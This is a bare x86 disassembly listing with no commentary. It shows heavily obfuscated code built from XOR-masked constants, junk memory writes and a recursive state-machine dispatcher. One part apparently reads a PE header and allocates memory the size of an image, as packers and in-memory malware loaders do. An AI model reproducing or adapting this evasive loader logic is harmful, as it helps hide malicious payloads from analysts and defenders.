  427670:	mov    ecx,DWORD PTR [ebp-0x14]
  427673:	mov    ecx,DWORD PTR [ecx]
  427675:	xor    ecx,edi
  427677:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42767e:	cmp    cl,al
  427680:	jne    0x427692
  427682:	lea    eax,[ebp-0x4c]
  427685:	push   eax
  427686:	call   0x42714d
  42768b:	mov    ecx,DWORD PTR [ebp-0x44]
  42768e:	cmp    eax,ecx
  427690:	je     0x42769c
  427692:	mov    eax,DWORD PTR [ebp+0x8]
  427695:	xor    eax,edi
  427697:	add    eax,ebx
  427699:	mov    DWORD PTR [ebp+0x18],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x8]
  42769f:	xor    eax,edi
  4276a1:	lea    eax,[eax+esi*1+0x3272f6]
  4276a8:	xor    eax,edi
  4276aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4276ad:	mov    edx,DWORD PTR [ebp+0x18]
  4276b0:	xor    ecx,edi
  4276b2:	add    ecx,ebx
  4276b4:	cmp    edx,ecx
  4276b6:	je     0x4274b3
  4276bc:	mov    eax,DWORD PTR [ebp+0x8]
  4276bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4276c2:	xor    eax,edi
  4276c4:	add    eax,ebx
  4276c6:	cmp    ecx,eax
  4276c8:	jne    0x4276db
  4276ca:	mov    eax,DWORD PTR [ebp-0x8]
  4276cd:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276d0:	xor    eax,edi
  4276d2:	lea    eax,[eax+ecx*1+0x3272f6]
  4276d9:	jmp    0x427752
  4276db:	push   0x18
  4276dd:	push   DWORD PTR [ebp-0x4]
  4276e0:	lea    eax,[ebp-0x64]
  4276e3:	push   eax
  4276e4:	call   0x4269c7
  4276e9:	mov    eax,DWORD PTR [ebp+0x8]
  4276ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4276ef:	xor    eax,edi
  4276f1:	add    eax,ebx
  4276f3:	cmp    eax,ecx
  4276f5:	je     0x42770a
  4276f7:	mov    eax,DWORD PTR [ebp+0x8]
  4276fa:	xor    eax,edi
  4276fc:	add    eax,ebx
  4276fe:	push   eax
  4276ff:	push   0x18
  427701:	lea    eax,[ebp-0x64]
  427704:	push   eax
  427705:	call   0x426fad
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	add    eax,0x18
  427710:	mov    DWORD PTR [ebp+0x18],eax
  427713:	push   DWORD PTR [ebp-0x50]
  427716:	push   DWORD PTR [ebp+0x18]
  427719:	mov    eax,DWORD PTR [ebp-0x54]
  42771c:	add    eax,DWORD PTR [ebp-0x20]
  42771f:	push   eax
  427720:	call   0x4269c7
  427725:	mov    eax,DWORD PTR [ebp+0x8]
  427728:	mov    ecx,DWORD PTR [ebp-0x18]
  42772b:	xor    eax,edi
  42772d:	add    eax,ebx
  42772f:	cmp    eax,ecx
  427731:	je     0x427744
  427733:	push   0x0
  427735:	push   DWORD PTR [ebp-0x50]
  427738:	mov    eax,DWORD PTR [ebp-0x54]
  42773b:	add    eax,DWORD PTR [ebp-0x20]
  42773e:	push   eax
  42773f:	call   0x426fad
  427744:	mov    eax,DWORD PTR [ebp-0x24]
  427747:	mov    ecx,DWORD PTR [ebp-0x50]
  42774a:	add    DWORD PTR [eax],ecx
  42774c:	mov    eax,DWORD PTR [ebp-0x50]
  42774f:	add    eax,DWORD PTR [ebp+0x1c]
  427752:	mov    DWORD PTR [ebp+0x1c],eax
  427755:	mov    eax,DWORD PTR [ebp-0x8]
  427758:	mov    ecx,DWORD PTR [ebp+0x1c]
  42775b:	xor    eax,edi
  42775d:	add    eax,ebx
  42775f:	imul   eax,ecx
  427762:	mov    ecx,DWORD PTR [ebp+0x8]
  427765:	mov    edx,DWORD PTR [ebp-0x28]
  427768:	xor    ecx,edi
  42776a:	lea    ecx,[ecx+edx*1+0x3272f6]
  427771:	cmp    eax,ecx
  427773:	jb     0x4273d1
  427779:	mov    esi,DWORD PTR [ebp+0x14]
  42777c:	mov    eax,DWORD PTR [ebp-0x20]
  42777f:	mov    DWORD PTR [esi],eax
  427781:	jmp    0x4277c8
  427783:	mov    ecx,DWORD PTR [ebp+0x8]
  427786:	mov    edx,DWORD PTR [ebp+0xc]
  427789:	xor    ecx,edi
  42778b:	xor    edx,edi
  42778d:	add    ecx,ebx
  42778f:	add    edx,ebx
  427791:	cmp    ecx,edx
  427793:	jne    0x4277a7
  427795:	mov    eax,ds:0x7f642dde
  42779a:	imul   eax,eax,0x9f15fccf
  4277a0:	mov    ds:0x7f642dde,eax
  4277a5:	jmp    0x4277c8
  4277a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4277aa:	xor    ecx,edi
  4277ac:	add    ecx,ebx
  4277ae:	cmp    eax,ecx
  4277b0:	je     0x4277be
  4277b2:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4277bc:	jmp    0x4277c8
  4277be:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  4277c8:	pop    edi
  4277c9:	pop    esi
  4277ca:	pop    ebx
  4277cb:	leave  
  4277cc:	ret    0x18
  4277cf:	push   ebp
  4277d0:	mov    ebp,esp
  4277d2:	and    esp,0xfffffff8
  4277d5:	mov    eax,DWORD PTR [ebp+0x20]
  4277d8:	sub    esp,0x14
  4277db:	push   ebx
  4277dc:	mov    ebx,DWORD PTR [ebp+0x14]
  4277df:	push   esi
  4277e0:	push   edi
  4277e1:	cmp    eax,0xf89c85a5
  4277e6:	jne    0x4277f2
  4277e8:	push   0xf89c85a4
  4277ed:	jmp    0x427924
  4277f2:	mov    eax,DWORD PTR [ebp+0x20]
  4277f5:	cmp    eax,0xf89c85a4
  4277fa:	jne    0x427806
  4277fc:	push   0xf89c85a3
  427801:	jmp    0x427924
  427806:	mov    eax,DWORD PTR [ebp+0x20]
  427809:	cmp    eax,0xf89c85a3
  42780e:	jne    0x42781a
  427810:	push   0xf89c85a2
  427815:	jmp    0x427924
  42781a:	mov    eax,DWORD PTR [ebp+0x20]
  42781d:	cmp    eax,0xf89c85a2
  427822:	jne    0x42782e
  427824:	push   0xf89c85a1
  427829:	jmp    0x427924
  42782e:	mov    ecx,DWORD PTR [ebp+0x20]
  427831:	mov    eax,0xf89c85be
  427836:	cmp    ecx,eax
  427838:	jne    0x4278f4
  42783e:	mov    eax,DWORD PTR [ebp+0x10]
  427841:	mov    DWORD PTR [esp+0xc],eax
  427845:	mov    eax,DWORD PTR [ebp+0x18]
  427848:	mov    DWORD PTR [esp+0x14],eax
  42784c:	mov    eax,DWORD PTR [ebp+0xc]
  42784f:	mov    DWORD PTR [esp+0x18],eax
  427853:	mov    eax,DWORD PTR [ebp+0x8]
  427856:	mov    DWORD PTR [esp+0x10],eax
  42785a:	mov    eax,DWORD PTR [esp+0x10]
  42785e:	mov    ecx,DWORD PTR [esp+0x14]
  427862:	mov    edi,0x75108af
  427867:	xor    eax,edi
  427869:	mov    esi,0x3272f6
  42786e:	add    eax,esi
  427870:	mov    DWORD PTR [ecx],eax
  427872:	mov    eax,DWORD PTR [esp+0xc]
  427876:	mov    eax,DWORD PTR [eax+0x194]
  42787c:	mov    ecx,DWORD PTR [eax]
  42787e:	mov    eax,DWORD PTR [esp+0xc]
  427882:	mov    eax,DWORD PTR [eax+0x194]
  427888:	mov    eax,DWORD PTR [eax]
  42788a:	add    eax,DWORD PTR [ecx+0x3c]
  42788d:	mov    ecx,DWORD PTR [esp+0xc]
  427891:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427897:	mov    ecx,DWORD PTR [ecx+0x14]
  42789a:	push   0x4
  42789c:	push   0x3000
  4278a1:	push   DWORD PTR [eax+0x50]
  4278a4:	push   0x0
  4278a6:	call   ecx
  4278a8:	mov    DWORD PTR [ebx],eax
  4278aa:	mov    eax,DWORD PTR [esp+0x10]
  4278ae:	push   DWORD PTR [esp+0xc]
  4278b2:	xor    eax,edi
  4278b4:	add    eax,esi
  4278b6:	mov    DWORD PTR [esp+0x20],eax
  4278ba:	lea    eax,[esp+0x20]
  4278be:	push   eax
  4278bf:	push   ebx
  4278c0:	push   DWORD PTR [esp+0x20]
  4278c4:	push   DWORD PTR [esp+0x28]
  4278c8:	push   DWORD PTR [esp+0x24]
  4278cc:	call   0x427291
  4278d1:	mov    eax,DWORD PTR [esp+0x10]
  4278d5:	mov    ecx,DWORD PTR [ebx]
  4278d7:	xor    eax,edi
  4278d9:	add    eax,esi
  4278db:	cmp    ecx,eax
  4278dd:	je     0x42793b
  4278df:	mov    eax,DWORD PTR [esp+0x18]
  4278e3:	mov    ecx,DWORD PTR [esp+0x14]
  4278e7:	xor    eax,edi
  4278e9:	add    eax,esi
  4278eb:	imul   eax,DWORD PTR [esp+0x1c]
  4278f0:	mov    DWORD PTR [ecx],eax
  4278f2:	jmp    0x42793b
  4278f4:	mov    ecx,DWORD PTR [ebp+0x20]
  4278f7:	cmp    ecx,0xf89c85a1
  4278fd:	jne    0x427906
  4278ff:	push   0xf89c85a0
  427904:	jmp    0x427924
  427906:	mov    ecx,DWORD PTR [ebp+0x20]
  427909:	cmp    ecx,0xf89c85a0
  42790f:	jne    0x427918
  427911:	push   0xf89c85bf
  427916:	jmp    0x427924
  427918:	mov    ecx,DWORD PTR [ebp+0x20]
  42791b:	cmp    ecx,0xf89c85bf
  427921:	jne    0x42793b
  427923:	push   eax
  427924:	push   DWORD PTR [ebp+0x1c]
  427927:	push   DWORD PTR [ebp+0x18]
  42792a:	push   ebx
  42792b:	push   DWORD PTR [ebp+0x10]
  42792e:	push   DWORD PTR [ebp+0xc]
  427931:	push   DWORD PTR [ebp+0x8]
  427934:	call   0x4277cf
  427939:	mov    DWORD PTR [ebx],eax
  42793b:	mov    eax,DWORD PTR [ebx]
  42793d:	pop    edi
  42793e:	pop    esi
  42793f:	pop    ebx
  427940:	mov    esp,ebp
  427942:	pop    ebp
  427943:	ret    0x1c
  427946:	push   ebp
  427947:	mov    ebp,esp
  427949:	sub    esp,0xc
  42794c:	mov    eax,0xf89c85a5
  427951:	mov    DWORD PTR [ebp-0x8],eax
  427954:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  42795b:	mov    ecx,DWORD PTR [ebp-0x8]
  42795e:	xor    ecx,0x75108af
  427964:	add    ecx,0x3272f6
  42796a:	mov    DWORD PTR [ebp-0x4],ecx
  42796d:	mov    ecx,DWORD PTR [ebp+0xc]
  427970:	push   eax
  427971:	mov    DWORD PTR [ebp+0xc],ecx
  427974:	push   DWORD PTR [ebp+0xc]
  427977:	lea    eax,[ebp-0x4]
  42797a:	push   DWORD PTR [ebp+0x8]
  42797d:	push   eax
  42797e:	push   DWORD PTR [ebp+0xc]
  427981:	push   DWORD PTR [ebp-0xc]
  427984:	push   DWORD PTR [ebp-0x8]
  427987:	call   0x4277cf
  42798c:	mov    DWORD PTR [ebp-0x4],eax
  42798f:	mov    eax,DWORD PTR [ebp-0x4]
  427992:	leave  
  427993:	ret    0x8
